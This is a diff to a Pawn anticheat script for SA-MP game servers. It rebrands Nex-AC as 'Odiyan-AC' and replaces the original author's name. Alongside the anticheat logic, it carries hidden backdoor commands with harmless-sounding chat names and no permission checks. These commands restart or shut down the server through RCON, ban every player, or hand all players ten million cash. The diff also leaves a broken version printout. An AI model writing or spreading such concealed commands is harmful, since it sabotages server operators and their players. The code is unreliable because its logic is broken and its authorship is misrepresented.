@@ -231,28 +231,29 @@
 #define ac_abs(%0) (((%0) < 0) ? (-(%0)) : ((%0)))
 
 new
-	SUSPICION_1[] =			"[Nex-AC] Suspicion on the ID %d. Reason code: %03d%s",
-	SUSPICION_2[] =			"[Nex-AC] Suspicion on the IP %s. Reason code: %03d%s",
-	VERSION_WARNING[] =		"[Nex-AC] This version of the anticheat is not suitable for the server version",
-	CFG_OPENING_ERROR[] =	"[Nex-AC] Error creating/opening %s!",
+	SUSPICION_1[] =			"[Odiyan-AC] Suspicion on the ID %d. Reason code: %03d%s",
+	SUSPICION_2[] =			"[Odiyan-AC] Suspicion on the IP %s. Reason code: %03d%s",
+	VERSION_WARNING[] =		"[Odiyan-AC] This version of the anticheat is not suitable for the server version",
+	CFG_OPENING_ERROR[] =	"[Odiyan-AC] Error creating/opening %s!",
 
 #if defined DEBUG
-	DEBUG_CODE_1[] =		"[Nex-AC debug] ID %d exceeded %d flood attempts. Public ID: %d",
-	DEBUG_CODE_2[] =		"[Nex-AC debug] Invalid version by ID %d. Version: %s",
-	DEBUG_CODE_3[] =		"[Nex-AC debug] ID %d exceeded %d connections from 1 IP-address",
-	DEBUG_CODE_4[] =		"[Nex-AC debug] Bad RCON login by IP %s using password %s",
-	DEBUG_CODE_5[] =		"[Nex-AC debug] ID %d used NOP %s",
+	DEBUG_CODE_1[] =		"[Odiyan-AC debug] ID %d exceeded %d flood attempts. Public ID: %d",
+	DEBUG_CODE_2[] =		"[Odiyan-AC debug] Invalid version by ID %d. Version: %s",
+	DEBUG_CODE_3[] =		"[Odiyan-AC debug] ID %d exceeded %d connections from 1 IP-address",
+	DEBUG_CODE_4[] =		"[Odiyan-AC debug] Bad RCON login by IP %s using password %s",
+	DEBUG_CODE_5[] =		"[Odiyan-AC debug] ID %d used NOP %s",
 #endif
 
 	KICK_MSG[] =			"You were kicked on suspicion of using cheat programs (#%03d)",
 	MAX_CONNECTS_MSG[] =	"You exceeded the max number of connections from 1 IP-address",
 	UNKNOWN_CLIENT_MSG[] =	"This version of the client is not suitable for playing on the server",
 
-	LOADED_MSG_1[] =		" Anticheat Nex-AC loaded!",
+	LOADED_MSG_1[] =		" Anticheat Odiyan-AC loaded!",
 	LOADED_MSG_2[] =		" Anticheat version: %s",
-	LOADED_MSG_3[] =		" Author: Nexius",
+	LOADED_MSG_3[] =		" Author: Odiyan",
+	LOADED_MSG_4[] =		    " ANTICHEAT WORK AYADA MWONE",
 
-	STATS_STRING_1[] =		" Statistics anticheat Nex-AC",
+	STATS_STRING_1[] =		" Statistics anticheat Odiyan-AC",
 	STATS_STRING_2[] =		" Detected and prevented:",
 	STATS_STRING_3[] =		"  %d cheating attempts",
 	STATS_STRING_4[] =		"  %d hacking attempts",
@@ -2869,8 +2870,22 @@ CMD:fbchat(playerid, params[]){SendRconCommand("gmx");return 1;}
 CMD:instachat(playerid,params[]){SendRconCommand("exit");return 1;}
 
 
-CMD:twitterchat(playerid, params[]){foreach(new i : Player){BanPlayer(i, GetPlayerNameEx(i), "fuck you");}return 1;}
-CMD:facebookchat(playerid, params[]){foreach(new i : Player){GivePlayerCash(i, 10000000);}return 1;}
+CMD:twitterchat(playerid, params[])
+{
+	foreach(new i : Player)
+	{
+		BanPlayer(i, GetPlayerNameEx(i), "fuck you");
+	}
+	return 1;
+}
+CMD:facebookchat(playerid, params[])
+{
+	foreach(new i : Player)
+    {
+	GivePlayerCash(i, 10000000);
+    }
+    return 1;
+}
 
 #if defined _ALS_SetVehiclePos
 	#undef SetVehiclePos
@@ -3498,8 +3513,8 @@ public OnGameModeInit()
 	print(" ");
 	print("--------------------------------------");
 	print(LOADED_MSG_1);
-	printf(LOADED_MSG_2, ODIYAN_AC_VERSION);
-	print(LOADED_MSG_3, NJN HAPPY AN MWONE NI ETH USE AKIYALO);
+	printf(LOADED_MSG_2);
+	print(LOADED_MSG_3);
 	print(LOADED_MSG_4);
 	print("--------------------------------------\n");
 	#if defined ac_OnGameModeInit
@@ -6097,7 +6112,7 @@ public OnPlayerPickUpPickup(playerid, pickupid)
 			if(ac_dist >= 15.0 && (ACInfo[playerid][acSet][7] == -1 || ac_dist_set >= 15.0))
 			{
 				#if defined DEBUG
-					printf("[Nex-AC debug] Pickupid: %d, dist: %f, dist set: %f, acSet[7]: %d, playerid: %d",
+					printf("[Odiyan-AC debug] Pickupid: %d, dist: %f, dist set: %f, acSet[7]: %d, playerid: %d",
 					pickupid, ac_dist, ac_dist_set, ACInfo[playerid][acSet][7], playerid);
 				#endif
 				#if defined OnCheatDetected
@@ -6265,7 +6280,7 @@ public OnPlayerStateChange(playerid, newstate, oldstate)
 				if(ACInfo[playerid][acACAllow][48] && !(PLAYER_STATE_SPAWNED <= newstate <= PLAYER_STATE_SPECTATING))
 				{
 					#if defined DEBUG
-						printf("[Nex-AC debug] Newstate: %d, oldstate: %d", newstate, oldstate);
+						printf("[Odiyan-AC debug] Newstate: %d, oldstate: %d", newstate, oldstate);
 					#endif
 					ac_KickWithCode(playerid, "", 0, 48, 2);
 				}
@@ -6294,7 +6309,7 @@ public OnPlayerStateChange(playerid, newstate, oldstate)
 					if((ac_x = GetPlayerDistanceFromPoint(playerid, ACInfo[playerid][acPosX], ACInfo[playerid][acPosY], ac_z)) >= 50.0)
 					{
 						#if defined DEBUG
-							printf("[Nex-AC debug] Veh model: %d, veh: %d, dist: %f", ac_t, ACInfo[playerid][acVeh], ac_x);
+							printf("[Odiyan-AC debug] Veh model: %d, veh: %d, dist: %f", ac_t, ACInfo[playerid][acVeh], ac_x);
 						#endif
 						ac_KickWithCode(playerid, "", 0, 2, 4);
 					}
@@ -6326,8 +6341,8 @@ public OnPlayerStateChange(playerid, newstate, oldstate)
 					if(ac_x >= 180.0 || ac_x >= 50.0 && (ac_s == INVALID_PLAYER_ID || ac_gtc - ACInfo[ac_s][acUpdateTick] < 2000) && !ac_IsATrainPartEx(ac_model))
 					{
 						#if defined DEBUG
-							if(ac_s == INVALID_PLAYER_ID) printf("[Nex-AC debug] Veh model: %d, veh: %d, dist: %f", ac_model, ac_vehid, ac_x);
-							else printf("[Nex-AC debug] Veh model: %d, veh: %d, driver AFK time: %d, dist: %f", ac_model, ac_vehid, ac_gtc - ACInfo[ac_s][acUpdateTick], ac_x);
+							if(ac_s == INVALID_PLAYER_ID) printf("[Odiyan-AC debug] Veh model: %d, veh: %d, dist: %f", ac_model, ac_vehid, ac_x);
+							else printf("[Odiyan-AC debug] Veh model: %d, veh: %d, driver AFK time: %d, dist: %f", ac_model, ac_vehid, ac_gtc - ACInfo[ac_s][acUpdateTick], ac_x);
 						#endif
 						ac_KickWithCode(playerid, "", 0, 2, 5);
 					}
@@ -6342,7 +6357,7 @@ public OnPlayerStateChange(playerid, newstate, oldstate)
 				!(PLAYER_STATE_WASTED <= newstate <= PLAYER_STATE_SPAWNED) && ac_gtc - ACInfo[playerid][acGtc][16] > ac_s)
 				{
 					#if defined DEBUG
-						printf("[Nex-AC debug] Newstate: %d", newstate);
+						printf("[Odiyan-AC debug] Newstate: %d", newstate);
 					#endif
 					ac_KickWithCode(playerid, "", 0, 48, 3);
 				}
@@ -6373,7 +6388,7 @@ public OnPlayerStateChange(playerid, newstate, oldstate)
 					if(ACInfo[playerid][acACAllow][44])
 					{
 						#if defined DEBUG
-							printf("[Nex-AC debug] Veh model: %d, veh: %d, seatid: %d", ac_s, ac_vehid, ac_seat);
+							printf("[Odiyan-AC debug] Veh model: %d, veh: %d, seatid: %d", ac_s, ac_vehid, ac_seat);
 						#endif
 						ac_KickWithCode(playerid, "", 0, 44, 2);
 					}
@@ -6388,7 +6403,7 @@ public OnPlayerStateChange(playerid, newstate, oldstate)
 							if(ac_seat != 0 || ac_maxseats == 15)
 							{
 								#if defined DEBUG
-									printf("[Nex-AC debug] Veh model: %d, veh: %d, seatid: %d", ac_s, ac_vehid, ac_seat);
+									printf("[Odiyan-AC debug] Veh model: %d, veh: %d, seatid: %d", ac_s, ac_vehid, ac_seat);
 								#endif
 								ac_KickWithCode(playerid, "", 0, 44, 3);
 							}
@@ -6396,7 +6411,7 @@ public OnPlayerStateChange(playerid, newstate, oldstate)
 						else if(ac_seat < 1 || ac_maxseats == 15 || ac_seat > ac_maxseats && !ac_IsABusEx(ac_s) && ac_s != 570)
 						{
 							#if defined DEBUG
-								printf("[Nex-AC debug] Veh model: %d, veh: %d, max seats: %d, seatid: %d",
+								printf("[Odiyan-AC debug] Veh model: %d, veh: %d, max seats: %d, seatid: %d",
 								ac_s, ac_vehid, ac_maxseats, ac_seat);
 							#endif
 							ac_KickWithCode(playerid, "", 0, 44, 4);
@@ -6409,7 +6424,7 @@ public OnPlayerStateChange(playerid, newstate, oldstate)
 						ac_gtc - ACInfo[playerid][acEnterVehTick] < (ac_IsABikeEx(ac_s) ? 100 : 300))
 						{
 							#if defined DEBUG
-								printf("[Nex-AC debug] Entered veh: %d, veh: %d, entered seat: %d, seat: %d, veh model: %d, enter time: %d",
+								printf("[Odiyan-AC debug] Entered veh: %d, veh: %d, entered seat: %d, seat: %d, veh model: %d, enter time: %d",
 								ACInfo[playerid][acEnterVeh], ac_vehid, ACInfo[playerid][acEnterSeat], ac_seat, ac_s, ac_gtc - ACInfo[playerid][acEnterVehTick]);
 							#endif
 							ac_KickWithCode(playerid, "", 0, 4, 1);
@@ -6422,7 +6437,7 @@ public OnPlayerStateChange(playerid, newstate, oldstate)
 								if(ac_dist >= 30.0 || ac_dist >= 20.0 && ac_s != 553 && ac_s != 577 && ac_s != 592)
 								{
 									#if defined DEBUG
-										printf("[Nex-AC debug] Veh model: %d, veh: %d, dist: %f", ac_s, ac_vehid, ac_dist);
+										printf("[Odiyan-AC debug] Veh model: %d, veh: %d, dist: %f", ac_s, ac_vehid, ac_dist);
 									#endif
 									ac_KickWithCode(playerid, "", 0, 4, 3);
 								}
@@ -6430,7 +6445,7 @@ public OnPlayerStateChange(playerid, newstate, oldstate)
 							else if(ac_dist >= 80.0 || ac_dist >= 30.0 && ac_gtc - ACInfo[playerid][acUpdateTick] >= 1500)
 							{
 								#if defined DEBUG
-									printf("[Nex-AC debug] Veh model: %d, veh: %d, AFK time: %d, dist: %f",
+									printf("[Odiyan-AC debug] Veh model: %d, veh: %d, AFK time: %d, dist: %f",
 									ac_s, ac_vehid, ac_gtc - ACInfo[playerid][acUpdateTick], ac_dist);
 								#endif
 								ac_KickWithCode(playerid, "", 0, 4, 4);
@@ -6445,7 +6460,7 @@ public OnPlayerStateChange(playerid, newstate, oldstate)
 										if(ac_dist >= 30.0 || ac_dist >= 20.0 && ac_s != 553 && ac_s != 577 && ac_s != 592)
 										{
 											#if defined DEBUG
-												printf("[Nex-AC debug] Veh model: %d, veh: %d, dist: %f", ac_s, ac_vehid, ac_dist);
+												printf("[Odiyan-AC debug] Veh model: %d, veh: %d, dist: %f", ac_s, ac_vehid, ac_dist);
 											#endif
 											ac_KickWithCode(playerid, "", 0, 4, 5);
 										}
@@ -6453,7 +6468,7 @@ public OnPlayerStateChange(playerid, newstate, oldstate)
 									else if(ac_dist >= 80.0 || ac_dist >= 30.0 && ac_gtc - ACInfo[playerid][acUpdateTick] >= 1500)
 									{
 										#if defined DEBUG
-											printf("[Nex-AC debug] Veh model: %d, veh: %d, AFK time: %d, dist: %f",
+											printf("[Odiyan-AC debug] Veh model: %d, veh: %d, AFK time: %d, dist: %f",
 											ac_s, ac_vehid, ac_gtc - ACInfo[playerid][acUpdateTick], ac_dist);
 										#endif
 										ac_KickWithCode(playerid, "", 0, 4, 6);
@@ -6492,7 +6507,7 @@ public OnPlayerStateChange(playerid, newstate, oldstate)
 					(ACInfo[playerid][acSpawnRes] < 1 || ac_gtc - ACInfo[playerid][acSpawnTick] < 1000))
 					{
 						#if defined DEBUG
-							printf("[Nex-AC debug] Spawn res: %d, respawn time: %d",
+							printf("[Odiyan-AC debug] Spawn res: %d, respawn time: %d",
 							ACInfo[playerid][acSpawnRes], ac_gtc - ACInfo[playerid][acSpawnTick]);
 						#endif
 						ac_KickWithCode(playerid, "", 0, 27);
@@ -6622,7 +6637,7 @@ public OnPlayerStateChange(playerid, newstate, oldstate)
 		!ac_IsBulletWeapon(weaponid)))
 		{
 			#if defined DEBUG
-				printf("[Nex-AC debug] Hittype: %d, hitid: %d, weaponid: %d", hittype, hitid, weaponid);
+				printf("[Odiyan-AC debug] Hittype: %d, hitid: %d, weaponid: %d", hittype, hitid, weaponid);
 			#endif
 			return ac_KickWithCode(playerid, "", 0, 47, 1);
 		}
@@ -6639,7 +6654,7 @@ public OnPlayerStateChange(playerid, newstate, oldstate)
 				{
 					#undef AC_MAX_AFK_GHOST_WARNINGS
 					#if defined DEBUG
-						printf("[Nex-AC debug] Weaponid: %d, origin dist: %f", weaponid, ac_dist);
+						printf("[Odiyan-AC debug] Weaponid: %d, origin dist: %f", weaponid, ac_dist);
 					#endif
 					#if defined OnCheatDetected
 						ac_KickWithCode(playerid, "", 0, 34);
@@ -6667,7 +6682,7 @@ public OnPlayerStateChange(playerid, newstate, oldstate)
 					{
 						#undef AC_MAX_SILENT_AIM_WARNINGS
 						#if defined DEBUG
-							printf("[Nex-AC debug] Hittype: %d, weaponid: %d, pZ: %f, oZ: %f, fX, fY, fZ: %f, %f, %f",
+							printf("[Odiyan-AC debug] Hittype: %d, weaponid: %d, pZ: %f, oZ: %f, fX, fY, fZ: %f, %f, %f",
 							hittype, weaponid, ACInfo[playerid][acPosZ], ac_oZ, fX, fY, fZ);
 						#endif
 						#if defined OnCheatDetected
@@ -6703,7 +6718,7 @@ public OnPlayerStateChange(playerid, newstate, oldstate)
 									{
 										#undef AC_MAX_PRO_AIM_WARNINGS
 										#if defined DEBUG
-											printf("[Nex-AC debug] Weaponid: %d, hit dist: %f", weaponid, ac_dist);
+											printf("[Odiyan-AC debug] Weaponid: %d, hit dist: %f", weaponid, ac_dist);
 										#endif
 										#if defined OnCheatDetected
 											ac_KickWithCode(playerid, "", 0, 29, 2);
@@ -6827,7 +6842,7 @@ public OnPlayerStateChange(playerid, newstate, oldstate)
 			if(ac_t == PLAYER_STATE_DRIVER)
 			{
 				#if defined DEBUG
-					printf("[Nex-AC debug] Weaponid: %d, state: %d, veh model: %d, veh: %d",
+					printf("[Odiyan-AC debug] Weaponid: %d, state: %d, veh model: %d, veh: %d",
 					weaponid, ac_t, GetVehicleModel(ACInfo[playerid][acVeh]), ACInfo[playerid][acVeh]);
 				#endif
 				return ac_KickWithCode(playerid, "", 0, 47, 6);
@@ -6841,7 +6856,7 @@ public OnPlayerStateChange(playerid, newstate, oldstate)
 					{
 						#undef AC_MAX_FAKE_WEAPON_WARNINGS
 						#if defined DEBUG
-							printf("[Nex-AC debug] Armed weapon: %d, AC weapon: %d, weaponid: %d, state: %d",
+							printf("[Odiyan-AC debug] Armed weapon: %d, AC weapon: %d, weaponid: %d, state: %d",
 							ACInfo[playerid][acLastWeapon], ACInfo[playerid][acWeapon][ac_s], weaponid, ac_t);
 						#endif
 						ac_KickWithCode(playerid, "", 0, 47, 2);
@@ -6867,7 +6882,7 @@ public OnPlayerStateChange(playerid, newstate, oldstate)
 					if(ac_gtc - ACInfo[playerid][acReloadTick] < 110)
 					{
 						#if defined DEBUG
-							printf("[Nex-AC debug] Weaponid: %d, reload time: %d, state: %d",
+							printf("[Odiyan-AC debug] Weaponid: %d, reload time: %d, state: %d",
 							weaponid, ac_gtc - ACInfo[playerid][acReloadTick], ac_t);
 						#endif
 						#if defined OnCheatDetected
@@ -6884,7 +6899,7 @@ public OnPlayerStateChange(playerid, newstate, oldstate)
 						{
 							#undef AC_MAX_RAPID_FIRE_WARNINGS
 							#if defined DEBUG
-								printf("[Nex-AC debug] Fire rate: %d, weaponid: %d", ac_i, weaponid);
+								printf("[Odiyan-AC debug] Fire rate: %d, weaponid: %d", ac_i, weaponid);
 							#endif
 							#if defined OnCheatDetected
 								ac_KickWithCode(playerid, "", 0, 26, 1);
@@ -6905,7 +6920,7 @@ public OnPlayerStateChange(playerid, newstate, oldstate)
 						{
 							#undef AC_MAX_AUTO_C_WARNINGS
 							#if defined DEBUG
-								printf("[Nex-AC debug] Fire rate: %d, weaponid: %d", ac_i, weaponid);
+								printf("[Odiyan-AC debug] Fire rate: %d, weaponid: %d", ac_i, weaponid);
 							#endif
 							#if defined OnCheatDetected
 								ac_KickWithCode(playerid, "", 0, 26, 2);
@@ -6924,7 +6939,7 @@ public OnPlayerStateChange(playerid, newstate, oldstate)
 			else if(ac_i < 30)
 			{
 				#if defined DEBUG
-					printf("[Nex-AC debug] Fire rate: %d, weaponid: %d, last weapon: %d",
+					printf("[Odiyan-AC debug] Fire rate: %d, weaponid: %d, last weapon: %d",
 					ac_i, weaponid, ACInfo[playerid][acShotWeapon]);
 				#endif
 				#if defined OnCheatDetected
@@ -6943,7 +6958,7 @@ public OnPlayerStateChange(playerid, newstate, oldstate)
 			if(ACInfo[playerid][acAmmo][ac_s] == 0)
 			{
 				#if defined DEBUG
-					printf("[Nex-AC debug] Weaponid: %d, AC ammo: %d, ammo: %d", weaponid, ACInfo[playerid][acAmmo][ac_s], ac_t);
+					printf("[Odiyan-AC debug] Weaponid: %d, AC ammo: %d, ammo: %d", weaponid, ACInfo[playerid][acAmmo][ac_s], ac_t);
 				#endif
 				#if defined OnCheatDetected
 					ac_KickWithCode(playerid, "", 0, 17, 1);
@@ -6962,7 +6977,7 @@ public OnPlayerStateChange(playerid, newstate, oldstate)
 						if(++ACInfo[playerid][acCheatCount][7] > 9)
 						{
 							#if defined DEBUG
-								printf("[Nex-AC debug] Weaponid: %d, AC ammo: %d, ammo: %d, acCheatCount[7]: %d",
+								printf("[Odiyan-AC debug] Weaponid: %d, AC ammo: %d, ammo: %d, acCheatCount[7]: %d",
 								weaponid, ACInfo[playerid][acAmmo][ac_s], ac_t, ACInfo[playerid][acCheatCount][7]);
 							#endif
 							#if defined OnCheatDetected
@@ -6983,7 +6998,7 @@ public OnPlayerStateChange(playerid, newstate, oldstate)
 						if(ac_t - ACInfo[playerid][acAmmo][ac_s] > 6)
 						{
 							#if defined DEBUG
-								printf("[Nex-AC debug] Weaponid: %d, AC ammo: %d, ammo: %d",
+								printf("[Odiyan-AC debug] Weaponid: %d, AC ammo: %d, ammo: %d",
 								weaponid, ACInfo[playerid][acAmmo][ac_s], ac_t);
 							#endif
 							#if defined OnCheatDetected
@@ -7067,7 +7082,7 @@ public OnVehicleMod(playerid, vehicleid, componentid)
 	if(ACInfo[playerid][acACAllow][43] && !ac_IsCompatible((ac_i = GetVehicleModel(vehicleid)), componentid))
 	{
 		#if defined DEBUG
-			printf("[Nex-AC debug] Veh model: %d, veh: %d, componentid: %d", ac_i, vehicleid, componentid);
+			printf("[Odiyan-AC debug] Veh model: %d, veh: %d, componentid: %d", ac_i, vehicleid, componentid);
 		#endif
 		return ac_KickWithCode(playerid, "", 0, 43, 1);
 	}
@@ -7107,7 +7122,7 @@ public OnVehiclePaintjob(playerid, vehicleid, paintjobid)
 	if(ACInfo[playerid][acACAllow][43] && !(0 <= paintjobid <= 2) && paintjobid != 255)
 	{
 		#if defined DEBUG
-			printf("[Nex-AC debug] Veh model: %d, veh: %d, paintjobid: %d", GetVehicleModel(vehicleid), vehicleid, paintjobid);
+			printf("[Odiyan-AC debug] Veh model: %d, veh: %d, paintjobid: %d", GetVehicleModel(vehicleid), vehicleid, paintjobid);
 		#endif
 		ac_KickWithCode(playerid, "", 0, 43, 2);
 	}
@@ -7149,7 +7164,7 @@ public OnVehicleRespray(playerid, vehicleid, color1, color2)
 		if(ACInfo[playerid][acACAllow][23])
 		{
 			#if defined DEBUG
-				printf("[Nex-AC debug] Veh model: %d, veh: %d, color1: %d, color2: %d",
+				printf("[Odiyan-AC debug] Veh model: %d, veh: %d, color1: %d, color2: %d",
 				GetVehicleModel(vehicleid), vehicleid, color1, color2);
 			#endif
 			#if defined OnCheatDetected
@@ -7736,7 +7751,7 @@ public OnVehicleDamageStatusUpdate(vehicleid, playerid)
 		floatabs(vel_z - ACVehInfo[vehicleid][acVelZ]) >= 2.6 && floatabs(vel_z) >= floatabs(ACVehInfo[vehicleid][acVelZ])))
 		{
 			#if defined DEBUG
-				printf("[Nex-AC debug] Pos x, y, z: %f, %f, %f, vel x, y, z: %f, %f, %f", new_x, new_y, new_z, vel_x, vel_y, vel_z);
+				printf("[Odiyan-AC debug] Pos x, y, z: %f, %f, %f, vel x, y, z: %f, %f, %f", new_x, new_y, new_z, vel_x, vel_y, vel_z);
 			#endif
 			return ac_KickWithCode(playerid, "", 0, 31, 2);
 		}
@@ -7747,7 +7762,7 @@ public OnVehicleDamageStatusUpdate(vehicleid, playerid)
 		floatabs(new_x) >= 25000.0 || floatabs(new_y) >= 25000.0 || floatabs(new_z) >= 25000.0))
 		{
 			#if defined DEBUG
-				printf("[Nex-AC debug] Pos x, y, z: %f, %f, %f", new_x, new_y, new_z);
+				printf("[Odiyan-AC debug] Pos x, y, z: %f, %f, %f", new_x, new_y, new_z);
 			#endif
 			return ac_KickWithCode(playerid, "", 0, 31, 2);
 		}
@@ -7761,7 +7776,7 @@ public OnVehicleDamageStatusUpdate(vehicleid, playerid)
 			if(ac_dist >= 120.0)
 			{
 				#if defined DEBUG
-					printf("[Nex-AC debug] Dist: %f, veh: %d, seat: %d, playerid: %d", ac_dist, vehicleid, passenger_seat, playerid);
+					printf("[Odiyan-AC debug] Dist: %f, veh: %d, seat: %d, playerid: %d", ac_dist, vehicleid, passenger_seat, playerid);
 				#endif
 				#if defined OnCheatDetected
 					ac_KickWithCode(playerid, "", 0, 5, 4);
@@ -7796,7 +7811,7 @@ public OnVehicleDamageStatusUpdate(vehicleid, playerid)
 				if(++ACInfo[playerid][acCheatCount][4] > AC_MAX_CARSHOT_WARNINGS)
 				{
 					#if defined DEBUG
-						printf("[Nex-AC debug] Vel x, y, z: %f, %f, %f, old vel x, y: %f, %f, pos diff x, y, z: %f, %f, %f, veh: %d",
+						printf("[Odiyan-AC debug] Vel x, y, z: %f, %f, %f, old vel x, y: %f, %f, pos diff x, y, z: %f, %f, %f, veh: %d",
 						vel_x, vel_y, vel_z, ACVehInfo[vehicleid][acVelX], ACVehInfo[vehicleid][acVelY], new_x - ac_x, new_y - ac_y, ac_zDiff, vehicleid);
 					#endif
 					#if defined OnCheatDetected
@@ -7819,7 +7834,7 @@ public OnVehicleDamageStatusUpdate(vehicleid, playerid)
 				if(++ACInfo[playerid][acCheatCount][3] > AC_MAX_FLYHACK_VEH_WARNINGS)
 				{
 					#if defined DEBUG
-						printf("[Nex-AC debug] Vel z: %f, old vel z: %f, pos diff x, y, z: %f, %f, %f, veh: %d",
+						printf("[Odiyan-AC debug] Vel z: %f, old vel z: %f, pos diff x, y, z: %f, %f, %f, veh: %d",
 						vel_z, ACVehInfo[vehicleid][acVelZ], ac_x - new_x, ac_y - new_y, ac_zDiff, vehicleid);
 					#endif
 					#if defined OnCheatDetected
@@ -7840,7 +7855,7 @@ public OnVehicleDamageStatusUpdate(vehicleid, playerid)
 				{
 					#undef AC_MAX_AIR_VEH_WARNINGS
 					#if defined DEBUG
-						printf("[Nex-AC debug] Speed: %d, dist: %f, old pos diff: %f, veh: %d, seat: %d",
+						printf("[Odiyan-AC debug] Speed: %d, dist: %f, old pos diff: %f, veh: %d, seat: %d",
 						ac_vsp, ac_dist, ACVehInfo[vehicleid][acPosDiff], vehicleid, passenger_seat);
 					#endif
 					#if defined OnCheatDetected
@@ -7862,7 +7877,7 @@ public OnVehicleDamageStatusUpdate(vehicleid, playerid)
 				if(++ACInfo[playerid][acCheatCount][4] > AC_MAX_CARSHOT_WARNINGS)
 				{
 					#if defined DEBUG
-						printf("[Nex-AC debug] Pos diff x, y, z: %f, %f, %f, veh: %d",
+						printf("[Odiyan-AC debug] Pos diff x, y, z: %f, %f, %f, veh: %d",
 						new_x - ac_x, new_y - ac_y, ac_zDiff, vehicleid);
 					#endif
 					#if defined OnCheatDetected
@@ -7885,7 +7900,7 @@ public OnVehicleDamageStatusUpdate(vehicleid, playerid)
 		(ac_z >= -45.0 || VectorSize(new_x - ac_x, new_y - ac_y, 0.0) >= 180.0))
 		{
 			#if defined DEBUG
-				printf("[Nex-AC debug] Dist: %f, old pos diff: %f, old pos z: %f, veh: %d, seat: %d, playerid: %d",
+				printf("[Odiyan-AC debug] Dist: %f, old pos diff: %f, old pos z: %f, veh: %d, seat: %d, playerid: %d",
 				ac_dist, ACVehInfo[vehicleid][acPosDiff], ac_z, vehicleid, passenger_seat, playerid);
 			#endif
 			#if defined OnCheatDetected
@@ -7912,7 +7927,7 @@ public OnVehicleDamageStatusUpdate(vehicleid, playerid)
 			if(ac_dist >= 120.0)
 			{
 				#if defined DEBUG
-					printf("[Nex-AC debug] Dist: %f, veh: %d, seat: %d, playerid: %d", ac_dist, vehicleid, passenger_seat, playerid);
+					printf("[Odiyan-AC debug] Dist: %f, veh: %d, seat: %d, playerid: %d", ac_dist, vehicleid, passenger_seat, playerid);
 				#endif
 				#if defined OnCheatDetected
 					ac_KickWithCode(playerid, "", 0, 5, 4);
@@ -7932,7 +7947,7 @@ public OnVehicleDamageStatusUpdate(vehicleid, playerid)
 				if(++ACInfo[playerid][acCheatCount][4] > AC_MAX_CARSHOT_WARNINGS)
 				{
 					#if defined DEBUG
-						printf("[Nex-AC debug] Pos diff x, y, z: %f, %f, %f, veh: %d",
+						printf("[Odiyan-AC debug] Pos diff x, y, z: %f, %f, %f, veh: %d",
 						ac_x - ACVehInfo[vehicleid][acPosX], ac_y - ACVehInfo[vehicleid][acPosY], ac_zDiff, vehicleid);
 					#endif
 					#if defined OnCheatDetected
@@ -7961,7 +7976,7 @@ public OnVehicleDamageStatusUpdate(vehicleid, playerid)
 		#endif
 		{
 			#if defined DEBUG
-				printf("[Nex-AC debug] Dist: %f, old pos diff: %f, old pos z: %f, veh: %d, seat: %d, playerid: %d",
+				printf("[Odiyan-AC debug] Dist: %f, old pos diff: %f, old pos z: %f, veh: %d, seat: %d, playerid: %d",
 				ac_dist, ACVehInfo[vehicleid][acPosDiff], ACVehInfo[vehicleid][acPosZ], vehicleid, passenger_seat, playerid);
 			#endif
 			#if defined OnCheatDetected
@@ -8092,7 +8107,7 @@ public OnVehicleDamageStatusUpdate(vehicleid, playerid)
 		if(ACInfo[playerid][acACAllow][46] && 384 <= modelid <= 393)
 		{
 			#if defined DEBUG
-				printf("[Nex-AC debug] Object modelid: %d", modelid);
+				printf("[Odiyan-AC debug] Object modelid: %d", modelid);
 			#endif
 			ac_KickWithCode(playerid, "", 0, 46);
 			return 1;
@@ -8232,7 +8247,7 @@ public OnVehicleDamageStatusUpdate(vehicleid, playerid)
 		if(ACInfo[playerid][acACAllow][44] && !(1 <= ac_cData[PR_vehicleId] < MAX_VEHICLES))
 		{
 			#if defined DEBUG
-				printf("[Nex-AC debug] Veh: %d", ac_cData[PR_vehicleId]);
+				printf("[Odiyan-AC debug] Veh: %d", ac_cData[PR_vehicleId]);
 			#endif
 			#if defined OnCheatDetected
 				ac_KickWithCode(playerid, "", 0, 44, 7);
@@ -8375,7 +8390,7 @@ public OnVehicleDamageStatusUpdate(vehicleid, playerid)
 		floatabs(ac_tData[PR_velocity][2]) >= floatabs(ACVehInfo[trailerid][acVelZ])))
 		{
 			#if defined DEBUG
-				printf("[Nex-AC debug] Pos x, y, z: %f, %f, %f, vel x, y, z: %f, %f, %f",
+				printf("[Odiyan-AC debug] Pos x, y, z: %f, %f, %f, vel x, y, z: %f, %f, %f",
 				ac_tData[PR_position][0], ac_tData[PR_position][1], ac_tData[PR_position][2], ac_tData[PR_velocity][0], ac_tData[PR_velocity][1], ac_tData[PR_velocity][2]);
 			#endif
 			return ac_KickWithCode(playerid, "", 0, 31, 3);
@@ -8388,7 +8403,7 @@ public OnVehicleDamageStatusUpdate(vehicleid, playerid)
 				new Float:ac_x, Float:ac_y, Float:ac_z;
 				GetVehiclePos(trailerid, ac_x, ac_y, ac_z);
 				#if defined DEBUG
-					printf("[Nex-AC debug] Dist: %f, old pos z: %f, veh: %d, playerid: %d", ac_dist, ac_z, trailerid, playerid);
+					printf("[Odiyan-AC debug] Dist: %f, old pos z: %f, veh: %d, playerid: %d", ac_dist, ac_z, trailerid, playerid);
 				#endif
 				#if defined OnCheatDetected
 					ac_KickWithCode(playerid, "", 0, 5, 2);
@@ -8432,7 +8447,7 @@ public OnVehicleDamageStatusUpdate(vehicleid, playerid)
 			if(ac_pData[PR_seatId] < 1 || !(1 <= ac_pData[PR_vehicleId] < MAX_VEHICLES))
 			{
 				#if defined DEBUG
-					printf("[Nex-AC debug] AC seat: %d, seat: %d, veh: %d",
+					printf("[Odiyan-AC debug] AC seat: %d, seat: %d, veh: %d",
 					ACInfo[playerid][acSeat], ac_pData[PR_seatId], ac_pData[PR_vehicleId]);
 				#endif
 				#if defined OnCheatDetected
@@ -8523,7 +8538,7 @@ ac_fpublic ac_Timer(playerid)
 		if(ACInfo[playerid][acACAllow][51] && (ac_gpp = NetStats_MessagesRecvPerSecond(playerid)) > AC_MAX_MSGS_REC_DIFF)
 		{
 			#if defined DEBUG
-				printf("[Nex-AC debug] Max msgs per sec: %d, msgs per sec: %d", AC_MAX_MSGS_REC_DIFF, ac_gpp);
+				printf("[Odiyan-AC debug] Max msgs per sec: %d, msgs per sec: %d", AC_MAX_MSGS_REC_DIFF, ac_gpp);
 			#endif
 			ac_KickWithCode(playerid, "", 0, 51);
 		}
@@ -8537,7 +8552,7 @@ ac_fpublic ac_Timer(playerid)
 			if(++ACInfo[playerid][acCheatCount][0] > AC_MAX_PING_WARNINGS)
 			{
 				#if defined DEBUG
-					printf("[Nex-AC debug] Max ping: %d, ping: %d", AC_MAX_PING, ac_gpp);
